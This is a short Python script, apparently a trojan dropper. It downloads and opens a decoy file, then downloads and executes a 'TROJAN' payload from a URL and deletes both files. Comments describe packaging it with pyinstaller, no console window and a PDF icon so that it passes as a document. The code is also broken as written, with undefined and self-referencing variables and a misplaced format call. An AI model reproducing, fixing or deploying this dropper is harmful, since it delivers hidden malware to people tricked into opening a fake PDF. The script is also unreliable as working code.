#!/usr/bin/env python

import requests
import subprocess
import os
import tempfile

CORPOREAL_EXE = ""
TROJAN = ""
CORPOREAL_FILE = CORPOREAL_EXE.split("/")[-1]
TROJAN_FILE = TROJAN_FILE.split("/")[-1]

def download(url):
    """
    Pulls file from given URL.
    """
    # TODO add len check to prevent ridiculously long filenames
    file_name = url.split("/")[-1]
    get_response = requests.get(url)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

tmp_dir = tempfile.gettempdir()
os.chdir(tmp_dir)

download(DIRECT_EXE)
# non-macos rm "open"
subprocess.Popen("open {i}", shell=True).format(i=file)

download(TROJAN)
subprocess.call(file, shell=True)

os.remove(CORPOREAL_FILE)
os.remove(TROJAN_FILE)

# use requests 2.5.1 w/pyinstaller
# macos pyinstaller --onefile --noconsole --icon pdf.icns name.py